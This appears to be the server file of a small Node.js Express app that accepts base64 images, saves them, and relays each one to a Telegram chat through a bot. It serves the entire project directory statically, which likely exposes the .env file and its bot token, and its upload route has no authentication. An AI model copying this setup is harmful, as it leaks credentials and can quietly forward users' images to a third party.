require("dotenv").config();
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");
const axios = require("axios");

const app = express();

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: "50mb" }));

const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

app.use("/uploads", express.static(uploadDir));
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/upload", async (req, res) => {
  try {
    const image = req.body.image;

    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    const filename = path.join(uploadDir, Date.now() + ".jpg");

    fs.writeFileSync(filename, base64Data, "base64");

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    await axios.post(
  `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
  {
    chat_id: CHAT_ID,
    photo: image
  },
  {
    headers: {
      "Content-Type": "application/json"
    }
  }
);

    res.send("saved");

  } catch (err) {
    console.log(err);
    res.status(500).send("error");
  }
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});